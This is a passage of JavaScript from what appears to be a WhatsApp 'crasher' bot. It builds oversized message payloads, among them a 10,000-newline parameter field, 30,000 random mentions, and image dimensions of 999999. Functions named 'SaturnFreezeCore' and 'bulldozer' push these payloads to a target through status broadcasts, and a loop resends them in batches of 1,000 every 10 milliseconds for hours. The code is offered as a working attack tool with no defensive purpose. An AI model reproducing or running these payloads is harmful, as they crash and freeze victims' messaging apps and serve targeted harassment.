GYRQwC/aymWr1D1f+VHBKxeNkqe2iKYh/ekT/AIlaQ1Jjh8AU9NHFENoAOQsngcLqBh4gUZDduRM0N3UvOADcqLcS65kUS3dy91AUAdyUbyoGHchXoAW70K61daoxgPBFckdFttQAW1dyo78qL4JQCtchQuJZ2on6UwoLluTSUuPr0/KljESYkzrT7KjlMdJEQpgIDF53lN4YnYjIhue7hVGkgEcTmse4QLLMvG0dRK9SROFPJMbajEWH4blRiJzarMtL9rL+VOkhwMHG17/ISf7MRCeIw3cnC7pKWmEIh81KVr+YUbA5/R6wPlVmv7hHN7wA/shFXzDwKxn/ABKgbJW1AMVrEHStSwQAAxvFreldDj+ZlZEsi8QU3aj6UKPZSupqKojlI5hzvYbQb5lacA+kHDKyJiKrsK1Z/wDSRBTVuJFTziBRlcIvbwqhBhIUABTy5xGRaJ4ytYvl4blWsy3qtaI9FyjBW2pZk9U0m1dBK18VbHkKCroMLx4nlMoe0EdJsQ5ry/PX1+z4X1hvVUZbu2DkLzj+pWTZ3aUZ3YzqDlpi5wK44y6h/pV2vN37SLPxya9m1ks22ewZBBNU0APPSjxXiNqpODY1tFR4p6HTUEvo1umd5dzj7B/CtMwfbkMSjKgr+zIbtJ2kOfvFWjCsLw+ln9Ip6eMZi51LGLVc3UrbUxb7r8VunYuwpsdhFZT0xVmPSOdZNawhyxh0/ESnqmoAB0um0leANkShMRxKxitLStDTReDOrs/MjPGa0TzY7SH2rDdtZwxfF/qSjJo6aIO3rXDpHhD+Ktu3G2seB0ZEJtJVTboo/WXV8LLPtnaKUsPra+vleSoq4imlO3U+nSP99S535G9VXSPZvYNO7dSfRUMTomqJqcbWH0qcQH4BzuK1ReKRXy5iziAREeXxKy2ekVtRdnbSQBAHLqLUX4VE1uQUWJTEV11kA/mWApslcgC48y1CO9X7YzDvsDrpR33ZB8KolOO7VzLT9mCH6upt/wAQ+VSz4qJHkxZafRGw83elgtSbaWFhQAW5Qk4vcuuRGLqQXbkAGuuRrhSbl/NE7RkoD8eHUjj3ukYySzDypZF4BRfyobd+lByvbxKPgY59SL42jwpRh3akXTcmAC0h5tSJ1I3VpRLWzJAAWorijlbmgJNAok/f7FFYgXaM4DwiOalH4Uyntij7QmucuXq8qYaCKxjTTEAjohDV5ulUeri7KTEQtYXEhtH5VoNRROdGcUr3GZZk/UqbWj2VbVDxEQROPt1LxI/I0kVU3fVEB77gEnL4f7IVG04uB05iXECsFFBdT1NOephubV5c/wDZQ0ERFRwnzxCJfENynT7eSJzYtgMUiyASK11tOFZThePTpXmPAKg6KQTHMRL/ACXoXYfFwnpwvLiHK1bnx1yu2hm5SaryVT6TMOkgeOsEdA7j/qTDDvq/G8MkgrDaklIRtmfUN3t6fi5Vt9bhNHjdEVPWA2RDqWO439GWJYNPMeDShPTd4xvy/MtS/BZX6kLtDfqRYXyyIvTdtSouT4RUHh21FNOAmQsFSxXAYcpdJKBaghpnllwipOmqNXAeg/iFXmOixmwqaeikkC3guHJPsO2Filn7fFwiij//ACG0nJZsYT7eBcv+Sx1XnYqmz+JFVPDcccswkN1hXWktpw/EX7ILncSt4VAR0eFYc/7LTQxOO/SIikajGYqcDM5QiH2latOhOj7Y5fKymy27KWWrxYRbO/es82z+kKnwaI4mL0isMfsoW/M/qUDtRt52FOfoXD3dofN7h5lnjhLilXNXVgnefV4LPyvkV9VlzC+NZvOw6+fGcUerxQ5JTMvAe4elvYKu4YjD6F6MIyR32x3OFunvL8IpphVGEFIOhgMgFsi5R/8AfMo/aOoeiw6a3jKImi+I9H5c1zbyztzJ0qRqvA1w8ibDpsQJv+umOcR6QHc3+TKCxm6DZyjHL/qqgpiL736clZcZgagwSOmD/BpxAfi4fzKq7WSnZRRFkLABNkPLwshT0hoO4W4eFaRgOmiAR77fvalnUDXGAktC2aISpuyItY3N81yln7RILRHLeA9SXYtyjoisduVh/CnrEoSWA11y65FQ3btKABJBn7URy3Itw+te6gSMZb0vGmYEOaeRqNhjvHqQ/LvQEuSCnZl3LuFd71z3Z+xAwR9LdRIEa5dxIABubUiSFq0rj78kSQrGIiTQA3MtxXcookVO9UbSlnYPB/UnNNQHXuJmLxwCXiPH/spdqPX5OUVNXWziy6qRU9O/Z2iN2ku9VHGMNtqITEbjlEoyYvLvFaNJANjiTKBrKJjNjJnIbv7JW3p1UrpdsxntfRlRNNUgNwVFOTl8dqGTAzHDqRxG4gisL5hzFWXH6UYtla0ya5wZwD16itFWmkwZp6Cm0XCcAfl0qWmjdeCtfkdLyM8pqUyp2MWe4d6uOzGLvRGInp6lKwYCwRlYw+YEWTAQHgBhfypkx7aX3Qqzn1MvEmkYZtQ0sY3Ha9qfnjkRN9qf3lksVFUxP9lKYWppitZWUdIRHUHp5bVsRnui+amM8VWt2NIxDG6eK9yMB8ypuJ7YQxZgB3LKPrbE8SOTtaoxG7TZpXBU1cDk0odqz83CSoXfJWv9il6jAq/di51e0tVUEXo4uLFuuIlD4vVehuZ1k+kRu3lcoaXaGGlj+1ExPla3U/uUdJ6XtNiHbTi8gmWimg1Osh7r7m4k3K6KKu8DWqnlxep7T/CDhzLcHmf2q+0WDMNPDMQH6MFtjGNpGXU4/p/Vcq9JhxUEoU9ZC8UoiLhCOqwep+pW2r2hGqgCGlo3iANwkZ2/hFJoy7RJPuvuAu4Xe0lWcUL6yxejoxbQUvaH5WHSP5TJPazETgiMiKMRHlUHhFYYTzVcrsUhDkN399P5ksQNsSeNykVdQwHriv7Qh6hBU/aUzPFDvffaLkPqu5VOzYldV1FRUWCIgMIX/eLL/JVernesr6ibeQkXMvYgXYNSARzhb1K8YeL0dWHKE273GPCXzKpYNF2tXFdnZxF8KvFPBfEQlmPahpUkioTFwnkfDcSXjPcoqhnvuCXTKO4vi/5cSkHLcJDy8TJSUXvQXebSk/cuYtyBQ927Ug/giuSLcjgCSpxKRytG5SkdLJZePD0rsPgiCOwxuceL2knzhbvAnFUZf/RY4Is9DorSj1J7LafEKjp4G1W6fcjcOBS5c/mTByMOA03nrD7I2le1yHjZG6i8Eh6UxG4hq8Em8sw3O5Db5kywyUziCyFyPu1aVNUmBz1j3TuflblSJu7dhp0Ve5GhUHOdsQX+5WHDtmppxGfEeDvEFYMLwOGiyIhYnUoUV7WiLCy16cVvblGzIX8EI1KN9gjaw8vqQvAIuQk2kVLSAMET26TTQInINQ8RLTRFUz3sZiJqYLuHhLcm70XaARcQipqWK1xYhT6nomIHa3lViEVyB7NDHdt/ssCqYMntMx7/ABtIi/StL2cBqjAsPIh1dgFrP4W6SH8Kp+3OG9rGNNAzFnBM+T/9o/1ZK77HtFPs/GQjrAs+m3tQGUfzpMXwtaJIM/zx1mB29EO4xa1N5KK65yVg9HaxrelNpKe1ya37y1Z1Y5XhiAlpwi4lRNr57swiBzO0rB839K0WsiLMtPs0qhYxAH1jNLO72gIh97Vu+6yzcj7eDTwq9W5kokdKNFIAFwhuLPx08SQknlncyoyCOEN3pMvD/DqdPcREayrPtdEA77Q7z6R/vlSMEFTUSt6OPaSiIsOXBGPS39XEsr7TpUjbvJDz4YAXSG7580k3GfuHwTjZqCpp67tBA/RpdBesh9ns6ldsO2GOc+1xGVzl77GHSrXR7PxUoHMeVnKxDqYVNTW26v8AxB7lVeBtjex5/VTVccQk8O8i4SIS8vlVRkoiB7ctPtK1bRg9fDiOBtEP2g64DHxtEiZZPjNYIRThRm0sQaJ6nk4rbQ5jLyjpWn8lSja3J+xWwbH8kn9SoYp2RSDTELa95MI3Pb7B5iLhSs+HTxURykPosIATkRDdKZflFWPZbAS34jXjfMRFaZcV3N8o8PxXEntXSjV18NOX7sC7SUfm0/iG75VixT4mhN2pV6fBKfCcOkqaoGkmAO0lkLU9yztt98hcT78/etH+kGtaloGo+0tmqTHQ3Q29yf8AyWfHHbHCAvrPXl0illFUauWZdpLfsHghYpUnZlcVsYl5eYloWPbOPSBHUUQPYBWEPqFSv0UbMlQYFDWVkbdpUawbyvvudWvFaL0qmqA8LM+H7qufSqycma2cyW6qYpUh6OfbxcvH5hUjDKJxCQ8wqW2hw16eQqiMNxllK1tuRKr0ZFT1c1MXB+8i+HmFZkpq3Em5XYrrzBJMVvFpR7ulIuVy5iuZNEDit25dcknLpXdqybgUt0NZCLfvQG7fxI8lbEWkXQx0A5aRbJA9E48PCqPRJOoog8t3CL/dR6OGCeQQrHkiEjFswG5KtAYv3J7RwWv9qOlS11qrd1EmzxLPP9FuHVGH9rRY28dSQ5iLheJfdFUqPZcKeolhrc+2AsiE1ouy2Mhh0sdHVH+xyllE5F+5Pp+EvzKz7R7KQ4zT9rELDWRDpfrHpXTT8bj5dHUoXWTB+utx7dLG7MZnRYRBTM2hlNU0ADpFlFvhE4XejzGLor0+KxMVpgXvFZUV6fqXZff9idK3LUm71kMblqYrVASnig3NLExfCSZ2Vxu98TZD0kpOuy+lFin+xMSVvbyW3aeVL9uwhluUJEc0bf8ATfDqRnlm33RGKjixiXpqP3nul79KmqCUSAre5VWyUjzsdOgqphCwAcjt7/Up67mQispV1C7QUY1VQEwDcAXtn8qa/RnKJ4FSlc5FLRxOWf8A/L7P8uSkHKUqYgEHtEO/mSOx8A0c9TSjEwxQ1hgFo8kusfzMpq52t5KWQn/jshoNPAPo4Fxac1H14hEx3uw+KXaqKKC3p3Kt4wZy2xgWouJaN1yohi0YrO3cj8RxymiuADuL2ARLN8dxSSeWqlGJxttsuLqERWnRYIBRcDX9Sz7FcNeXaCkpLbY6iqsP1aS4furKfqv7NyuKk9EfgmyU1e8ctaUhHKN4sOnR1fMS0fBtj4oAFyiATHh03ZD0qewbDo4HlrKiwZb8hAe4RTipxK1pXibTy2+K0K8VEXmTMuy3ZuIImsp4aKIzEbC4NKrkpz1pkRE4wBy9Sla0Zqp7Zc8u9N5ogo4i7V+ISt9nUleFHplm9kZsVA+JYji+GnJ+ygYzGAnpMS4hcunS33lE4jSxbTbQSTYeHZ4BSHZAY6Wmlbc7h7uXpucvUkYIKuq2niwPC6r0M8SgsrJB5IX1EPve12FaltJgtLhGF0EeHwhBR0w9gIewub4rhTJDXYrRH6l2XWi5f7FKfs4I3EBYAAc9I7mFQeHiY0ctbVP2TVZdtrK0gC3d8OnUn+KCVQ3ocX/2CEC+DvP8Of3lTtv8XMcPmooMhh0RykHOXLE35i+FZDNqXFXbxKLjWI/XuNT1Q3dhdlFd4t6/4qT2OwGbabHooiZnjlPW4DwRNxF/p8yYPhcoU0EMY/bTbgER3vl3m/q6VuX0b7L/AFHhxTS5DVVQjcPMAco/qS0pu/cbJuWpOxoVMIQWQ0wMEEVoALDuYR4RQ1eQsdmWpEg0P8qO5NJnc7eVbBzkf7K9jGHBPA5yhpIcjWQYxSyYbidOB94Hln6wJb7WQdtAYdSybbygEoqOpHTLFUDGXmEi/wCLrMyK/wAmxg3NtxJAN5kLF91Eu3uhVKDdFLkGlEuRbkwGtBBy8Pyoz0oE3gnbCRXI7Rb9Wn2qx01MbqMNAoo35UoFKItbbbbzJy4ELjuYksA6PiUqVqRzYzDNqFiYru4lftksZKcPQKw3KoiHMDL/ABQ/qFU5iS0ZyxHFLTOwzRFeBebp+bhV7Eu+nfmPRTvTqpxJadpsIEJPT4BtEy+1tHhLq+ZVaQpAufiHqWkUVVT4vhgyizFFOGRgXL1CqDidGeHVcsBk5WcL+seUlq51XC9ZPUlPEvbyrn2pHnVbtQIA7GVtQ8SPITGHc64KUMtJWrKhNjR6jBoaCE8rtKdBhdPkXDmm7QEL5iW5Lx35aiVlK0b2pBNjhTwZsrs9SZnhFvLu+JSbHKIcTEnEcok3Da6eceoX6h1IcKAsiG1tW5NMPongxSvDfn2UL/DpJhL8CsjWZ+VcFKJVD1IMwmY2EQ8wrz6dV9CfUM/aRGeK9rwzG7zJl6BeY6VNsIgZCgM4om08ZJZp2GW7T0Mo6eyMgHVKXj6hWe4xS3Yzg9SAWw0spHfdzERf0rRKmUQjmaJrrhJyNRVZhfa0jAAa4jFx+IbVJNa6kc3Mou0drWCN2lNpRtutB/My6CoIHsl0kO4c+9Oy1sRWqF52IET8kQ9xH3WiKgMfrQooxkIO1P8AwoQ4pjLcAfxfJWs6dyMhFtxCL3KtUlK2JbSVNUeqDDPs4mfhKYh1P8ovb85KBi9TK+yA+rj2ZOkxKcmnr/SBqq2QeFzu1CPsZtIrZMeoBrMGqADWQxXgIjaOnf8ApVGxygGqw+UD1adSv2x9UOKbKYbNObDbF2MrkXMGgs/uq98bqzvTP7KQfIO2iXR+rGNVAHLiVQYH2QRRDGUg8t2ouLmttWa4k1LVVr1LyW4VQm4U+W/tnbjP/T3q6bXYo8dM+GUhvCdaUpyzW3GFPdkLs3rIRYR+JOdkdjSnlhq8ZpWigiAQo6UhHIB6i836lgTS27IbK3Kle8jPYnY+Y5XxjGI7ZDG2CC3TG125v78Vp8BMBlaTEBW/MlZBEGYh0sI5Kty4y0FYcO7QWSbdaexRZmyG2LMFQJOVr6S3aeZO6e70jK5vWKgaOtvBhFxUxT2ysRi7ixcNquV2K5FKajyciFjLqVExWjCvrWhFmKniunl+G0gD8xl8qsON1r0FIfYOcs8pDHAAcZmXKy7DsDLDqIgqnaSsqC7SoO64b7crW9gjkIosjfsPXOncxiWI6eeWGTiAss0DFuVi20w70WrCqEbRl0G3mVYuWNMatwdHS+6LIpduQ5+1JXbkGftXhMbkBJS7dwojRDldvR2DmErVp6nNzIYDLqQgVvFwpJ9LoLrW4kuwvIoFpcLo7dOepJx8xCjiW+7iS7nmxZdi694a+agl4Kge2i+NuIf/AAX3lL7WYa9RRNVRt9pT8TdQEqRHVegT09UOd1PKMny834c1rHYx1UBAeqIx/wAl1WA65GPNc/gw8vaq9bIMrtIUUCcU+npSglliN7niImSNhC/mWLMMjcGqliuvIW+1G4nz3oj5ijXtbpFNDjCjW2Pyo4G3KzpLdmhtfPyqWHYjmBxcJM3KuYrUk0ZE+YvalGDdxb1LFjEXCil1rZkfCk3Mt1w3SluQ9gJG12QinMUF1ziV2nhTRsLLqoyMNzCWnUKVtIRz/KlKiC7LTaSWeNii6rkrEXOxFywXb+L3pmwnFJpG5vxKYcRytHiTCe0bnLSq0joMqmqCnp5qk8+yhApNPENo5qB2Ulz2cw6SXJpqkPSJS6jlK9/zKXr4hqKOoEOMwJtPgojZuUZdmsHIrDEqUA4dQkGgh+8KimfItp41sTcodrEeh+HiTHZ7aT6n2WxOGkhOsxE604KClB95yygOWXw739iQxSshoKOQ7G7Qh0RsNxmXqYf6tKc/RdsYT0kuOYm7lW1UhWA+rsYn8G8z26iZWsNHfKiE/sQZF1dWLLP/AFGVDsBNhuJjiePnHWYlUj2xmA/ZxkOTCADzMw5av7KxNBo08o6VfailLFKbsZADh0G12YEqViYVOES9jWUziRbxMNTGPsVnMwvp25T0ZmJnNldn9kFi9YFLTHJK9ggJOZeoVmNJLJiNfNWyuYjKeYM/gPKpj6TMe9FweQbDA6ghh3ju834VA4HOU8AOAsPvJcfkTs/B1+FXqnMlzopbWZrviUt/8gjp37CnA6usIdMMI3EPvLhEfMSq9PRnKTDLUyWcwBoH+PMrLhkEVLHZTxsAd+Q6c/erGPsLdCj7Z/CD9NPFcZMJa890QNqCnDpbzeZWCQd5dKY0h7ulPWPd4LXTXUzX2Zio7U4a1fSTQkLZmOYv0kKyJxILgMbTEsiZb3WxdqLtbqWRbY4X9XYi84DbFUFq8pLOyq9e5rYNn6EBci3IrFvRXJ895s6zzXN/DMWQPb61zla2lEeVuElsOcxPkEkO3cSIx3PlcmlRP0qHbFBCpsI7dJPb61nu+oRGxaIC6dSccJ6e9R1NOIsA5tdbqT4NW+5Mguos4CbEJ8BDkS0XZOoKqwGjM87xDsy+R7f0rPQyJlcNijtw42fSI1ErD/NdL8T/ANrL/UyM/wD6hntJT+j4gRi26Yc7vMP9soTwJydXbH6A6+neWAXKaLeIjzDbqFUxtW8U2dXpbz/IXCs3Tj+ISx0W3iSu8X1IbmHhVA0uRLhSgZkBXc3qQcXqQMRC3cvYnUUVjK3x0pdj3JqxkhC4377WTw5FMKPGyKAy8U4jLgIeC1IU43Rjp/2R4842IC4B8FZSdiq8ilR09O/NMmlINJcPKKfNlY9xJCSITAr24kPAJKiRcKQMRNnYkRwON9DuTCuYiMnHP7wqpJYUjZ4CC5xHTpVdwUmwqrqaOcmGhq53mgK3dGb94v0i/f71d/RyJytyJMKnDWlk9Gp6X0qpmG0IQ5/f5fMk6bMxJ1l17jANnpcZxEKCnBxqZR+1lL/Ci5i/SK1imw8MLpgipQEAiAWFi6WFQGB7KVuytNnRYg0lRPa9QFTFe3lEC4hYfVq+FS0uJVMrM1VD2RcziN4feErh+YV02BjdGOZ9ycvn5X1DaI3ZRaO+AyfhYi1EgxSlpsSojpqodBcJD3gXUKWA2OMrXuAuJITxXRkQ6enJasor9pMlJZW5g8tfSvA/1uWFVB3FCN+Y9RcJfdVf2WrCABhPMTEsiV5+m3D5YcdoK4g0zQFC5ctwPmP4SWbUcvYVYmPPxL5b8lR9PmOin1/AfrYSOajTHcyl4Jd1u9VjCp74xU7BLb5kUz4kVkFipDazxUiB3N5VAwGIt3qRhk3anWlXJReB2eSq+0+EhX0kkZDqIdJdJdSsjF1JtVixgWle2RuoU+DGDyAcUhxy6TAsiRLla9tcJ7CdqyAHES3S/wBSqFywXjpzwdPSy2Jyb9e/Cm8pXeDrmNEM7nIVsOcyNKrgdVGvDsMXpJzdhhECvu8qttTnZ7FRtvyOLCAqAK2yoBjJugv7ZZd0E9ceXBacOxH0w2tLh3qz0xXcRXCss2bxyIYI2ue4loeHVoG2YZWipqJ8RLk1J7twiBzJ9wir/szQFS4RTtUNbKQ3mxeBEWbqh4BTti+Lxwln2NPbNP08WkfvflWlNOwRla/+67L4ihtZsk5X5K77a4Fo6oSchu3qKxXZ8K2+oo8oqjvJuQ1135k6p61uA8yL2Ct67HV14kyq3epuYKNIElOZxVAFHKPEzovaXMtBmoKWvhIKsBl6S4Sb+Kr1ZsgbE54dMxNyhJ/Uuct+PdG8O8G5Tno3Z/ErrAWfjkht3JzUYXW0ZENRTTCw+IBc34U0IxuyItXS6zprdPal6LEb0weMN/UnAAm4anzF0u0oi+RJVEmRzEdr29KWvYm096j3qIhfUbZ/EifWlPmW/X6m1Kyk6lR4bYkHNhZ7ntf1JnKZizvfp9aS7eqqrvRcOq57emAk7i2a2hrHG6jjpgLmmlHd8o3KWd29KMkovd21GAnNdaNpXI5zkLfalGI9Ks9BsAfHiWKH8FOFufzErDRbPYXhbicFOPa2/vZdb/iXteHa/vsQ3fI49S+HkUjDNnsUxQyKIHpqb/8AabT/ACDiJXTCsBocBjIqcHOc+OYyuM059OYbrS3prLUkd3TatmjCVDAvzbcjt9sBqqftboQG5uYun/dM/wB15vzIwaWy8e8lzlv08y01XUqxB1tu4UY9TEHghjC1yYveKM4llpRyHGpnn0i7LBtLgU9ObftMQ9pSndwS8vylw/MvLRiQGYGzgYlkQF3sS9r1kHaxmHgvL30r7Plg2051IC/YV32gv4Xjxf6F8y5P/IMTZFyY/X2dz/jmX5NjT/8AIjs9X3RMxPw8quFOd+VvCsrwisenqbc9xLQaCoYgG3mXHVzqdPcmrFmjPdqT+mO5tSgqeW5ruZScU4/wWkklGYJqMmLzLpImyfTcyaRm27pT1jIm0q5H2lcr2L0DVEBgYjIJDlaSyTE8Fno6ySEAMwHhf2LbamIi4ss1AVFCByk+pZ91XLF2m3RSYvYm8bkRytZEu/kjP3dynnyIJgSMbrlV9sqL0zZ3E4m4+weQfeG/9KtlpExetMamAZ4jiILmMCAh+JU7E2UEfVuTDcAr5YpW37lqODYsYQMwC5mRZCLd5l4CsrwyLspbDHgLIvlWq7BUQ1FWNfPmMcOiDzFzF+lLg0tdatcFrNlUTc2nZSi+q6AIyy9Jm+0nMfEv73KemqrmsbhHcqpT4k0UZBfbKVtxKRpKq9rYjcvaI7l9WpVKkhE/B8/dGZ2eSXjIj0gWr4U7jLsGcA1FzESZRGETEAlcXrQtPu1cKsEEwzeh00pC+hLx1pA+rIhTBp2yIrnQgYmy88GF6ZMR14HvLMerUlHOmlb7SGMx9o3KHA2R2JstKimlWI5Rl9En6BhhvqoqfP8A7QofqbCi/wDo05e4BUexnlpJ0s32WuWV7fiUE46nnL/yH4YThoNooaUX/wC0KXYKWBtIQxj6hERUG9fLO7hQA+rnNKwUjA3aVknaH7UsUKosw35YlXrYR0jM35kWXEhDdxe5Q0tUxOQU4t8SNEJA2ZcSkilSLT/Y/wDT5SDR3kkTmM9xGkc35c0aO0XdS6LHoXjUGISsy4bfWjONzanRG7yLm8yK53Nbm9xIF1OuuEfMnMYdm2rU/wCVJQxjTnduJy5nS7k5Dp0/ElmSTUIf70NTXFdpSj92l0nGP2vlEdXxI76lGLPiN5Qbesx+lnZkcb2fquyC6qp/t4X8zcv8RzWoycO9QmKA0sBjlc4ospXIqaufyS4t7Y96un6ni9i4SB/arhgWJdrGF3EPF8SgdpcO+qdocTohCyKKoKwfIW8f/Kb4ZWei1GRFoPcvkro1Lsk/qfZPG6pXj9jUqSo3qXpzEmIlT8OqrmF+ZWGknu4lcrcyngnozEd4knkUtzaWZRNOd3N7U9jOxleRypMDmXUCh5HNi8FLsVwau5MZAa5009wieAkZCNyVtuZN4iud3LmFO49LaVXJpkS4XySJiKcv3Cmx55WrzUrmM1GHEW0tfQBmIjOZmfqAiz/UtOwOUaeILA/ZoRFhAdKquOUowbR1L5MPpAhIT/Ll+lS1HOb5BFqu3CtD4uFpZpJsn/mRYkvmGTliVQRmD9iFunhG7pVrgqBHuH+CrOGE1LTRgJcPF8SlYJRLxXYo/icxZHkT0UvF3D06k5AGJmuUZBKIvlzJ7GYk2hEuxFoPAiAvWlWiEeFyJNIzue0U5Yi4URYJMCoQW8Jo4AefgiglPzKeLGK0wC0pD3IrRPK+Z8vrSoCOepHuERK1Sw5AwmBDE2QcSAs5X1kht+Vc+nwUhAKAAAGkWuQuXuSYmXLwoW4dWpEEWwZiQsk2Ic+JDd+Fe8EXIduZLxaOVIASOxF1WqKYF51HLFvfuzXOVtxeCRubVvQXXe4VHwPFmwcCKx7tTkWZIXMhZEvtcu61JnKOb3I4PJ8gJJepRFfLdEdvcnUs7epV3Fa2wHU3OqntMeZ52+lQBDbCU92c1OBl8W9v0sqXcrR9Ilb6ZtTU6ruxiCP5uL9Sqa+TfIyrZlvH8j7RgQy4aRP8Sz4FiT5WEW8VcKCqK9iu9iy2mnKCUTHlV2wytvYLe7qVatxb0/Je6eoYh1cSkgPhfwVZo5Wly1KYpzLcJZrRRzNmCVA9HekCJs0QCJKj3f8AJSbkXAjT6mzJPtOXxJjDwJyGrvTxHIr9gHHfxfMkpNLd6Xy3JHiHekmCEo+2ICM9HP1CQf6odm7jN5Te6MOHTzJ7trGP1QxZbwnDL7qY4Hpowy6Vcwp8yZu9RdqOqukEeJTNNPdvLUXKqlRk9w/CrHS8K6pG2MWxeCehNy3ipGIrcu5REGkdyfweClKckrEVzfCncfc3dcmVOT3MnkKOCtMjpiubIkowpMO75UoHEpoInkOHvR+IWtZJ83yrh4FKpTlhRh70TSNy7qQP4qeCvIV/KguXFxohp1ImAu6ko2r3JPPck7nzJOIOmNsnQ9qybDxOiTG4RkQvvtSijrt+XmXduwNxb1H3vYSTM3G7JRzI8QSElRxJpJWDlpdMiN8iUbNMeveoeSWFF63ErWIRfUqTtLtDDh1FNPUHaADqb9KlKmUiIs35Vj+21TJPXRU0pXQuN9vtuWb8hktjUs6m/wDFYPWvWJkoVXWHVVM08v72YyM/iJIuTqXOKPL90H8kzrqcIm+zzb+K+WS8s3Mn1KI6a8QNbn3qWwat7A+zJ+bSShmQtpMSbvuTKK0cmnYdWXWiZfMrDTS3cyomEG5tq6VaKM3ydXEYynXhixQVBEnPbt4qNjJxYsk6jZ7e91PyVpg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "Nando Is Here Ahaha"
                },
                footer: {
                  text: "phynx.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {   
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await rofik.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
}

async function isagicombofc(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 1000) {
            await Promise.all([
            CursorBynando(target, true),
            ]);
            console.log(chalk.red(`Sucesfully Send ${count}/1000 ${target}`));
            count++;
            setTimeout(sendNext, 10);
        } else {
            console.log(chalk.green(`✅ Sucesfully Send 1000 Messages ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 1000 Messages"));
            setTimeout(sendNext, 10);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 10);
    }
};
async function SaturnFreezeCore(targetJid, mentionAll = true) {
    console.log("[SaturnCrasher] Initiating SaturnFreezeCore exploit...");

    const freezePayload = generateWAMessageFromContent(targetJid, {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: 999999,
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "Saturn Freeze Core Injected",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: Array.from({ length: 30000 }, () =>
                            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                        )
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "Freeze",
                                    songId: "Freeze",
                                    author: ".SaturnCrasher",
                                    title: "Saturn Freeze",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "t.me/SaturnCrasher",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: true
                        }
                    ]
                }
            }
        }
    }, {});

    await rofik.relayMessage("status@broadcast", freezePayload.message, {
        messageId: freezePayload.key.id,
        statusJidList: [targetJid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: targetJid }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mentionAll) {
        await rofik.relayMessage(targetJid, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: freezePayload.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "SaturnFreezeCore" }, content: undefined }]
        });
    }

    console.log(`[SaturnCrasher] SaturnFreezeCore deployed to ${targetJid}`);
}
async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
